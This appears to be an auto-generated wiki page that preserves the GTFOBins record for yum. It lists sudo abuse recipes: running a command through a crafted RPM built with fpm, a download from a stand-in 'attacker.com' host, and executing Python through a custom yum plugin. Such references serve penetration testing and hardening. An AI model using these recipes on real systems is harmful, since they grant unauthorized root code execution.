---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# yum

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `yum` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/yum` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [yum](../../tools/linux/yum.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | yum |
| name | yum |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/yum/ |

## Preserved Source Material

````yaml
_body: ''
_name: yum
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/yum
functions:
  command:
  - code: yum localinstall -y x-1.0-1.noarch.rpm
    comment: 'Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.


      ```

      echo /path/to/command >x.sh

      fpm -n x -s dir -t rpm -a all --before-install .x.sh .

      ```'
    contexts:
      sudo: null
  download:
  - code: yum install http://attacker.com/path/to/input-file.rpm
    comment: The file on the remote host must have the `.rpm` extension, but the content does not have to be an RPM file.
      The file will be downloaded to a randomly created directory in `/var/tmp/yum-root-xxxxxx/`.
    contexts:
      sudo: null
    sender: http-server
  inherit:
  - code: "cat >/path/to/temp-dir/x<<EOF\n[main]\nplugins=1\npluginpath=/path/to/temp-dir/\npluginconfpath=/path/to/temp-dir/\n\
      EOF\n\ncat >/path/to/temp-dir/y.conf<<EOF\n[main]\nenabled=1\nEOF\n\ncat >/path/to/temp-dir/y.py<<EOF\nimport yum\n\
      from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n\
      \  ...\nEOF\n\nyum -c /path/to/temp-dir/x --enableplugin=y"
    comment: This allows to run Python code (`...`).
    contexts:
      sudo: null
    from: python
````
